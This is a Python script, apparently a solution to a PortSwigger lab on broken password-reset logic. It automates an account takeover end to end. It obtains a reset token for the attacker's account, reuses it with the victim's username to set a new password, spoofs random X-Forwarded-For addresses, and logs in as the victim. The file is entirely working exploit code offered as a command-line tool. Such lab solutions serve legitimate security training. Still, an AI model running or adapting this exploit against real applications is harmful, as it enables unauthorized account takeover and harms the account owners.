from requests import request
from bs4 import BeautifulSoup
from random import randint
from sys import argv

def get_session(url):
    print('GET '+url)
    res=request(url=url,method='GET')
    cookies=""
    for key,value in res.cookies.get_dict().items():
        cookies=cookies+key+"="+value+";"
    return cookies

def generate_random_ip():
    return str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))+'.'+str(randint(0,255))

def send_resset_password_url(forgot_password_url,cookies,username):
    data='username='+username
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
            }
    print('POST '+forgot_password_url +'  '+data)
    res=request(url=forgot_password_url,method='POST',data=data,headers=headers)
    return res

def get_email_box_url(login_url,cookies):
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
            }
    print('GET '+login_url)
    res=request(url=login_url,method='GET',headers=headers)
    soup=BeautifulSoup(res.content.decode(),'html.parser')
    email_url=soup.find('a',{'id':'exploit-link'}).get('href')
    print('[+] Found Email Server Link: '+email_url)
    return email_url

def get_resset_password_url(email_url,cookies):
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
            }
    print('GET '+email_url)
    res=request(url=email_url,method='GET',headers=headers)
    soup=BeautifulSoup(res.content.decode(),'html.parser')
    resset_url=soup.find('a',{'target':'_blank'}).get('href')
    return resset_url


def get_resset_token(resset_url,cookies):
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
            }
    print('GET '+resset_url)
    res=request(url=resset_url,method='GET',headers=headers)
    soup=BeautifulSoup(res.content.decode(),'html.parser')
    resset_token=soup.find('input',{'name':'temp-forgot-password-token'}).get('value')
    return resset_token

def set_new_passwrod(resset_url,cookies,resset_token,username,new_password):
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
            }
    data='temp-forgot-password-token='+resset_token+'&username='+username+'&new-password-1='+new_password+'&new-password-2='+new_password
    print('POST '+resset_token+'  '+data)
    res=request(url=resset_url,method='POST',headers=headers,data=data)

def login(login_url,cookies,username,password):
    headers={
        'Cookie':cookies,
        'X-Forwarded-For':generate_random_ip()
    }
    data='username='+username+'&password='+password
    print('POST '+login_url+'  '+data)
    res=request(url=login_url,method='POST',headers=headers,data=data)
    return res

def pwn(url,attacker_username,victime_username, new_password):
    cookies=get_session(url)
    email_url=get_email_box_url(url+'login',cookies)
    send_resset_password_url(url+'forgot-password',cookies,attacker_username)
    resset_password_url=get_resset_password_url(email_url,cookies)
    resset_token=get_resset_token(resset_password_url,cookies)
    set_new_passwrod(url+'forgot-password',cookies,resset_token,victime_username,new_password)
    login(url+'login',cookies,victime_username,new_password)
    print("[+] Pwned Successfully : Now Username is: "+victime_username+'  New Password is: '+new_password)

if __name__ == "__main__":
 print("""
    0xCrypt00o Soluation for Portswigger LAB : Password-Reset-Broken-Logic
        For More Soluation check :
                https://github.com/Crypt00o/Portswigger-Labs/
    """)
 if len(argv)==5:
     pwn(argv[1],argv[2],argv[3],argv[4])
 else:
     print("call it with : ./pwn-auth-password-reset-broken-logic.py <url> <attacker username>  <victime_username> <new victime password> ")